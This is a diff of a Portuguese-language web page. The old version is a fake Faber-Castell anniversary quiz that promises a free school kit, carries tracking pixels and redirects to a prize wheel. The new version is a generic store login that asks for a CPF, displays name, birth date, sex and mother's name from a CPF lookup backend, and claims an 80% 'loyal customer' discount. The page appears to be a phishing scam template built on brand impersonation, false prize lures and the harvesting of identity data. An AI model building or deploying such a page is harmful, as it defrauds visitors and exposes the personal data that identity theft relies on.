@@ -1,224 +1,490 @@
-<!DOCTYPE html><html lang="pt-br"><head>
-       
-    <link rel="icon" type="image/png" sizes="16x16" href="images/favicon.ico">
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Loja - Login</title>
 
-    <meta charset="UTF-8">
-    <script src="js/latest_2.js" data-utmify-prevent-subids="" async="" defer=""></script>
-<script>
-  window.pixelId = "687756f4a5ce99fee613b675";
-  var a = document.createElement("script");
-  a.setAttribute("async", "");
-  a.setAttribute("defer", "");
-  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
-  document.head.appendChild(a);
-</script>
+  <link href="https://fonts.googleapis.com/css2?family=Sora:wght@400;600;700&display=swap" rel="stylesheet">
 
-<script src="js/latest_1.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+  <style>
+    :root{
+      --brand-red:#c6282d;
+      --brand-blue:#4a73b2;
+      --text:#222;
+      --muted:#6b7280;
+      --border:#d7d7d7;
+      --bg:#ffffff;
+    }
 
-<script src="js/latest_2.js" data-utmify-prevent-subids="" async="" defer=""></script>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Loja Oficial</title>
-    <link rel="stylesheet" href="css/styles.css">
+    *{ margin:0; padding:0; box-sizing:border-box; }
+    body{
+      font-family:"Sora", system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif;
+      background:#fff;
+      color:var(--text);
+    }
 
-    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&display=swap" rel="stylesheet">
-    <script src="js/latest.js" data-utmify-prevent-subids="" async="" defer=""></script>
+    /* HEADER */
+    .topbar{
+      background:var(--brand-red);
+      height:140px;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+    }
+    .brand{
+      color:#fff;
+      text-align:center;
+      user-select:none;
+    }
+    .brand .brand-name{
+      font-weight:700;
+      letter-spacing:2px;
+      font-size:42px;
+      line-height:1;
+    }
+    .brand .brand-sub{
+      font-style:italic;
+      margin-top:8px;
+      opacity:.9;
+      font-size:16px;
+    }
 
+    /* CONTAINER */
+    .wrap{
+      max-width:780px;
+      margin:0 auto;
+      padding:40px 16px 70px;
+    }
+
+    /* CARD LOGIN */
+    .card{
+      background:var(--bg);
+      border:2px solid var(--border);
+      border-radius:4px;
+      padding:42px 36px 34px;
+      max-width:640px;
+      margin:0 auto;
+    }
+
+    .card h1{
+      font-size:40px;
+      font-weight:700;
+      margin-bottom:14px;
+      text-align:left;
+    }
+
+    .divider{
+      height:2px;
+      background:var(--border);
+      margin:12px 0 28px;
+    }
+
+    label{
+      display:block;
+      text-align:left;
+      font-weight:600;
+      font-size:22px;
+      margin-bottom:14px;
+    }
+
+    .input{
+      width:100%;
+      height:62px;
+      border:2px solid var(--border);
+      border-radius:6px;
+      font-size:20px;
+      padding:0 16px;
+      outline:none;
+      transition:border-color .15s ease;
+    }
+    .input:focus{ border-color:#b9c7e6; }
+
+    .btn-primary{
+      width:100%;
+      height:68px;
+      margin-top:22px;
+      border:none;
+      border-radius:8px;
+      background:var(--brand-blue);
+      color:#fff;
+      font-weight:700;
+      font-size:28px;
+      cursor:pointer;
+      transition:transform .08s ease, filter .15s ease;
+    }
+    .btn-primary:active{ transform:scale(.99); }
+    .btn-primary:hover{ filter:brightness(.98); }
+
+    .fineprint{
+      text-align:center;
+      margin-top:22px;
+      font-size:22px;
+      line-height:1.4;
+      color:var(--text);
+    }
+    .fineprint a{
+      color:var(--text);
+      text-decoration:underline;
+      font-weight:600;
+    }
+
+    /* BLOCO CRIAR CONTA */
+    .below{
+      max-width:640px;
+      margin:34px auto 0;
+      text-align:center;
+    }
+    .below h2{
+      font-size:34px;
+      font-weight:700;
+      margin-bottom:18px;
+    }
+    .btn-outline{
+      width:100%;
+      height:70px;
+      max-width:520px;
+      border-radius:8px;
+      border:2px solid var(--brand-blue);
+      background:#fff;
+      color:var(--brand-blue);
+      font-size:30px;
+      font-weight:700;
+      cursor:pointer;
+    }
+
+    /* TELA 2: RESUMO */
+    .summary{
+      max-width:640px;
+      margin:0 auto;
+      border:2px solid var(--border);
+      border-radius:4px;
+      padding:34px 30px;
+      background:#fff;
+    }
+    .summary h1{
+      font-size:34px;
+      font-weight:700;
+      margin-bottom:14px;
+      text-align:left;
+    }
+    .badge{
+      display:inline-block;
+      margin-top:10px;
+      background:#fff3cd;
+      border:2px solid #ffe08a;
+      color:#7a5a00;
+      padding:10px 12px;
+      border-radius:10px;
+      font-weight:700;
+      font-size:16px;
+    }
+    .grid{
+      margin-top:18px;
+      display:grid;
+      grid-template-columns: 1fr;
+      gap:12px;
+    }
+    .row{
+      border:2px solid var(--border);
+      border-radius:10px;
+      padding:14px 14px;
+      text-align:left;
+    }
+    .row .k{
+      font-size:12px;
+      color:var(--muted);
+      font-weight:700;
+      text-transform:uppercase;
+      letter-spacing:.6px;
+    }
+    .row .v{
+      margin-top:6px;
+      font-size:18px;
+      font-weight:700;
+      color:var(--text);
+      word-break:break-word;
+    }
+
+    .cta{
+      margin-top:18px;
+      font-size:18px;
+      line-height:1.5;
+      text-align:left;
+      color:#111;
+    }
+
+    .btn-row{
+      margin-top:20px;
+      display:flex;
+      gap:12px;
+      flex-wrap:wrap;
+    }
+    .btn-small{
+      flex:1;
+      min-width:220px;
+      height:56px;
+      border-radius:10px;
+      border:none;
+      cursor:pointer;
+      font-weight:800;
+      font-size:18px;
+    }
+    .btn-small.primary{ background:var(--brand-blue); color:#fff; }
+    .btn-small.ghost{ background:#f3f4f6; color:#111; border:2px solid var(--border); }
+
+    /* LOADING */
+    .loading{
+      display:none;
+      margin-top:14px;
+      font-size:14px;
+      color:var(--muted);
+      font-weight:600;
+      text-align:left;
+    }
+
+    /* RESPONSIVO */
+    @media (max-width:520px){
+      .topbar{ height:120px; }
+      .brand .brand-name{ font-size:34px; }
+      .card{ padding:30px 18px 24px; }
+      .card h1{ font-size:32px; }
+      label{ font-size:18px; }
+      .fineprint{ font-size:18px; }
+      .btn-primary{ font-size:22px; height:62px; }
+      .below h2{ font-size:26px; }
+      .btn-outline{ font-size:24px; height:64px; }
+    }
+  </style>
 </head>
-    
- 
+
 <body>
-    
- <audio id="trilha" loop="">
+  <!-- ✅ ÁUDIO DE FUNDO (extraído) -->
+  <audio id="trilha" loop>
     <source src="media/musica.mp3" type="audio/mpeg">
     Seu navegador não suporta o elemento de áudio.
   </audio>
 
-  <script type="08960269feae09195330b29d-text/javascript">
-    document.addEventListener("DOMContentLoaded", function() {
-      var trilha = document.getElementById('trilha');
-      
-      // Set volume to 0.01 and log the volume level
-      trilha.volume = 0.05;
-      console.log("Volume set to: " + trilha.volume);
+  <!-- HEADER -->
+  <header class="topbar">
+    <div class="brand" aria-label="Marca">
+      <div class="brand-name">SUA LOJA</div>
+      <div class="brand-sub">since 1761</div>
+    </div>
+  </header>
 
-      function tentarTocarAudio() {
-        trilha.play().then(function() {
-          // Log success if the audio starts playing
-          console.log("Reprodução automática bem-sucedida.");
-        }).catch(function(error) {
-          // Log failure and try again after 1 second
-          console.log("Reprodução automática falhou. Tentando novamente...");
-          setTimeout(tentarTocarAudio, 1000); // Tenta novamente após 1 segundo
-        });
+  <main class="wrap">
+    <!-- TELA 1: LOGIN -->
+    <section id="screen-login">
+      <div class="card">
+        <h1>Faça seu login</h1>
+        <div class="divider"></div>
+
+        <form id="loginForm">
+          <label for="cpfEmail">E-mail ou CPF:</label>
+          <input
+            id="cpfEmail"
+            class="input"
+            type="text"
+            inputmode="numeric"
+            placeholder="Digite seu CPF"
+            autocomplete="off"
+            maxlength="14"
+          />
+
+          <button class="btn-primary" type="submit">Continuar</button>
+          <div class="loading" id="loading">Consultando dados…</div>
+
+          <div class="fineprint">
+            Ao continuar, você concorda com a<br>
+            <a href="#" onclick="return false;">Política de Privacidade</a> da Loja.
+          </div>
+        </form>
+      </div>
+
+      <div class="below">
+        <h2>Ainda não possui cadastro?</h2>
+        <button class="btn-outline" type="button" onclick="alert('Fluxo de cadastro aqui.')">
+          Crie sua conta
+        </button>
+      </div>
+    </section>
+
+    <!-- TELA 2: RESUMO -->
+    <section id="screen-summary" style="display:none;">
+      <div class="summary">
+        <h1>Resumo do cadastro</h1>
+        <div class="badge">🎉 Você recebeu <b>80% de desconto</b> na Promoção de Volta às Aulas por ser um cliente fiel.</div>
+
+        <div class="grid" id="summaryGrid"></div>
+
+        <p class="cta">
+          Para resgatar seu desconto, clique em <b>Continuar</b>.
+        </p>
+
+        <div class="btn-row">
+          <button class="btn-small ghost" type="button" id="btnBack">Voltar</button>
+          <button class="btn-small primary" type="button" id="btnContinue">Continuar</button>
+        </div>
+      </div>
+    </section>
+  </main>
+
+  <script>
+    const $ = (sel) => document.querySelector(sel);
+
+    const loginForm = $("#loginForm");
+    const input = $("#cpfEmail");
+    const loading = $("#loading");
+
+    const screenLogin = $("#screen-login");
+    const screenSummary = $("#screen-summary");
+    const summaryGrid = $("#summaryGrid");
+
+    const btnBack = $("#btnBack");
+    const btnContinue = $("#btnContinue");
+
+    function onlyDigits(s){ return (s || "").replace(/\D/g, ""); }
+
+    // Máscara CPF: 000.000.000-00
+    function maskCpf(v){
+      const d = onlyDigits(v).slice(0, 11);
+      let out = d;
+      if (d.length > 3) out = d.slice(0,3) + "." + d.slice(3);
+      if (d.length > 6) out = d.slice(0,3) + "." + d.slice(3,6) + "." + d.slice(6);
+      if (d.length > 9) out = d.slice(0,3) + "." + d.slice(3,6) + "." + d.slice(6,9) + "-" + d.slice(9);
+      return out;
+    }
+
+    function isValidCpfDigits(cpf){
+      if (!cpf || cpf.length !== 11) return false;
+      if (/^(\d)\1{10}$/.test(cpf)) return false;
+      return true;
+    }
+
+    input.addEventListener("input", () => {
+      const v = input.value;
+      if (v.includes("@")) return;
+      input.value = maskCpf(v);
+    });
+
+    function escapeHtml(str){
+      return String(str ?? "").replace(/[&<>"']/g, (m) => ({
+        "&":"&amp;", "<":"&lt;", ">":"&gt;", '"':"&quot;", "'":"&#039;"
+      }[m]));
+    }
+
+    function renderSummary(dados){
+      const rows = [
+        { k: "CPF", v: dados.cpfFormatado || dados.cpf || "-" },
+        { k: "Nome", v: dados.nome || "-" },
+        { k: "Nascimento", v: dados.nascimento || "-" },
+        { k: "Sexo", v: dados.sexo || "-" },
+        { k: "Nome da mãe", v: dados.nome_mae || "-" },
+      ];
+
+      summaryGrid.innerHTML = rows.map(r => `
+        <div class="row">
+          <div class="k">${r.k}</div>
+          <div class="v">${escapeHtml(r.v)}</div>
+        </div>
+      `).join("");
+    }
+
+    // Placeholder: aqui você conecta seu backend
+    async function consultarCpfNoSeuBackend(cpfDigits){
+      return {
+        cpf: cpfDigits,
+        nome: "",
+        nascimento: "",
+        sexo: "",
+        nome_mae: ""
+      };
+    }
+
+    loginForm.addEventListener("submit", async (e) => {
+      e.preventDefault();
+
+      const raw = input.value.trim();
+      const isEmail = raw.includes("@");
+      const cpfDigits = onlyDigits(raw);
+
+      if (isEmail){
+        const dados = { cpf:"", cpfFormatado:"", nome: raw, nascimento:"", sexo:"", nome_mae:"" };
+        renderSummary(dados);
+        screenLogin.style.display = "none";
+        screenSummary.style.display = "block";
+        return;
       }
 
-      tentarTocarAudio();
+      if (!isValidCpfDigits(cpfDigits)){
+        alert("Digite um CPF válido (11 dígitos).");
+        return;
+      }
+
+      loading.style.display = "block";
+
+      try{
+        const dados = await consultarCpfNoSeuBackend(cpfDigits);
+
+        const dadosOk = {
+          cpf: cpfDigits,
+          cpfFormatado: maskCpf(cpfDigits),
+          nome: dados?.nome || "",
+          nascimento: dados?.nascimento || "",
+          sexo: dados?.sexo || "",
+          nome_mae: dados?.nome_mae || ""
+        };
+
+        renderSummary(dadosOk);
+        screenLogin.style.display = "none";
+        screenSummary.style.display = "block";
+      } catch(err){
+        alert("Não foi possível carregar os dados agora. Tente novamente.");
+      } finally {
+        loading.style.display = "none";
+      }
     });
+
+    btnBack.addEventListener("click", () => {
+      screenSummary.style.display = "none";
+      screenLogin.style.display = "block";
+    });
+
+    btnContinue.addEventListener("click", () => {
+      window.location.href = "/loja/";
+    });
+
+    /* ✅ AUTO-PLAY DO ÁUDIO (extraído e adaptado) */
+    (function(){
+      const trilha = document.getElementById("trilha");
+      if (!trilha) return;
+
+      trilha.volume = 0.05;
+
+      let started = false;
+
+      async function playAudio(){
+        if (started) return;
+        try{
+          await trilha.play();
+          started = true;
+        } catch(e){
+          // navegador bloqueou (normal). Vai liberar no 1º gesto do usuário.
+        }
+      }
+
+      // tenta tocar quando carrega
+      document.addEventListener("DOMContentLoaded", playAudio);
+
+      // garante que toque no primeiro gesto
+      const unlockEvents = ["click","touchstart","keydown","scroll","mousemove"];
+      const unlock = () => {
+        playAudio();
+        unlockEvents.forEach(ev => window.removeEventListener(ev, unlock, { passive:true }));
+      };
+      unlockEvents.forEach(ev => window.addEventListener(ev, unlock, { passive:true }));
+    })();
   </script>
-  
-  
-    <div class="header">
-        <img src="images/logo-fabercastell.png" alt="Logo">
-    </div>
-
-    <div class="titllee">
-        <h1>Bem-vindo ao <br> Desafio da Faber Castell!</h1>
-    </div>
-
-
-    <div class="container ">
-        <div class="content ">
-            <!-- Tela inicial do quiz -->
-            <div id="start-screen" class="quiz-screen ">
-<img src="images/img01.jpg" alt="Logo Heineken" width="300" style="margin-bottom: 25px;">
-                <p>Em comemoração ao <strong>aniversário de 264 anos</strong> da marca, preparamos um <strong>Desafio</strong> onde você pode mostrar sua criatividade, aprender curiosidades sobre a nossa história e, claro, <strong>ganhar um kit de volta às aulas completíssimo!</strong>
-    <br><br>  
-    Não fique de fora dessa <strong>celebração única</strong>. Participe e leve para casa o melhor da <strong>Faber-Castell!</strong>  
-</p>
-                <button id="start-quiz" class="btn">COMEÇAR</button>
-
-            </div>
-
-            <!-- Pergunta 1 -->
-            <div id="question-1" class="quiz-screen hidden">
-                <h2>Etapa 1: Criatividade</h2>
-                <p>Quantas cores você acha que existem na maior caixa de lápis Faber-Castell?</p>
-                <div class="options">
-                    <button class="option incorrect">84</button>
-                    <button class="option correct">120</button>
-                    <button class="option incorrect">150</button>
-                </div>
-                <button class="btn next-btn">Próxima Pergunta</button>
-                
-                <div class="valor-total">
-                    <p>Desconto total: 0%</p>
-                </div>
-            </div>
-
-            <!-- Pergunta 2 -->
-            <div id="question-2" class="quiz-screen hidden">
-                <h2>Etapa 2: Conhecimento</h2>
-
-                <p>Qual é o material sustentável usado na fabricação dos EcoLápis?</p>
-                <div class="options">
-                    <button class="option incorrect">Bambu</button>
-                    <button class="option correct">Madeira reflorestada</button>
-                    <button class="option incorrect">Papelão</button>
-                </div>
-                <button class="btn next-btn">Próxima Pergunta</button>
-                
-                <div class="valor-total">
-                    <p>Desconto total: 25%</p>
-                </div>
-            </div>
-
-            <!-- Pergunta 3 -->
-            <div id="question-3" class="quiz-screen hidden">
-                <h2>Etapa 3: Curiosidade</h2>
-                <p>Desde que ano a Faber-Castell existe?</p>
-                <div class="options">
-                    <button class="option incorrect">1801</button>
-                    <button class="option incorrect">1871</button>
-                    <button class="option correct">1761</button>
-                </div>
-                <button class="btn next-btn">Próxima Pergunta</button>
-                
-                <div class="valor-total">
-                    <p>Desconto total: 50%</p>
-                </div>
-            </div>
-
-            <!-- Pergunta 4 -->
-            <div id="question-4" class="quiz-screen hidden">
-                <h2>Etapa 4: Arte</h2>
-                <p>Qual produto Faber-Castell você escolheria para criar uma obra de arte detalhada?</p>
-                <div class="options">
-                    <button class="option incorrect">Lápis de Cor</button>
-                    <button class="option correct">Marcadores Pitt</button>
-                    <button class="option incorrect">Canetinhas Hidrográficas</button>
-                </div>
-                <button class="btn next-btn">Próxima Pergunta</button>
-                
-                <div class="valor-total">
-                    <p>Desconto total: 75%</p>
-                </div>
-            </div>
-
-            <!-- Pergunta 5 -->
-            <div id="question-5" class="quiz-screen hidden">
-                <h2>Etapa 5: Personalização</h2>
-
-                <p>Qual dessas opções seria a melhor maneira de personalizar o seu estojo Faber-Castell?</p>
-                <div class="options">
-                    <button class="option correct">Escrever seu nome com uma Caneta Gel Faber-Castell</button>
-                    <button class="option incorrect">Colocar adesivos Faber-Castell com seus desenhos favoritos</button>
-                    <button class="option incorrect">Pintar com Brush Pen Faber-Castell</button>
-                </div>
-                <button class="btn next-btn">Próxima Pergunta</button>
-                
-                <div class="valor-total">
-                    <p>Desconto total: 100%</p>
-                </div>
-            </div>
-
-
-
-            <!-- Tela de conclusão do quiz -->
-            <div id="end-screen" class="quiz-screen hidden">
-<h2>Parabéns!</h2>
-<p class="p-resgate">Incrível! Você acaba de conquistar um prêmio especial!</p>
-<img src="images/img02.png" alt="Logo Heineken" width="300" style="margin-bottom: 20px;">
-<p>Estamos aqui para reconhecer sua dedicação e lhe presentear com um <strong>"Kit Completo de Volta as Aulas"!</strong> </p>
-<br>
-<p>Você agora faz parte da celebração dos <strong>264 anos da Faber-Castell</strong> no Brasil. <strong>Clique no botão abaixo</strong> para escolher seu kit e resgatar um brinde exclusivo.</p>
-<br>
-<br>
-			<a href="/roleta" class="btn btn-resgate">RESGATAR SEU BRINDE</a>
-            </div>
-        </div>
-    </div>
-
-    <!-- popUp para selecionar alguma pergunta -->
-    <div class="selecione-resposta hidden ">
-        <p class="selecione-resposta-p">selecione uma resposta!</p>
-        <button class="btn back-btn">voltar</button>
-    </div>
-
-
-    <!-- popUp para selecionar alguma pergunta -->
-    <div class="dica ">
-        <div class="dica-1 hidden popUp-dica">
-            <p class="dica-errado">Resposta errada, tente novamente para resgatar o prêmio</p>
-            <button class="btn back-btn">TENTE NOVAMENTE</button>
-        </div>
-
-        <div class="dica-2 hidden popUp-dica">
-            <p class="dica-errado">Resposta errada, tente novamente para resgatar o prêmio</p>
-            <button class="btn back-btn">TENTE NOVAMENTE</button>
-        <p></p></div>
-
-        <div class="dica-3 hidden popUp-dica">
-            <p class="dica-errado">Resposta errada, tente novamente para resgatar o prêmio</p>
-            <button class="btn back-btn">TENTE NOVAMENTE</button>
-        </div>
-
-        <div class="dica-4 hidden popUp-dica">
-            <p class="dica-errado">Resposta errada, tente novamente para resgatar o prêmio</p>
-            <button class="btn back-btn">TENTE NOVAMENTE</button>
-        </div>
-
-        <div class="dica-5 hidden popUp-dica">
-            <p class="dica-errado">Resposta errada, tente novamente para resgatar o prêmio</p>
-            <button class="btn back-btn">TENTE NOVAMENTE</button>
-        </div>
-    </div>
-
-    <div class="footer">
-
-    </div>
-    <script src="js/script.js" type="08960269feae09195330b29d-text/javascript"></script>
-
-<script src="js/latest_1_1.js" async="" defer="" type="08960269feae09195330b29d-text/javascript"></script>
-
-<script src="js/rocket-loader.min.js" data-cf-settings="08960269feae09195330b29d-|49" defer=""></script>
-</body></html>
+</body>
+</html>
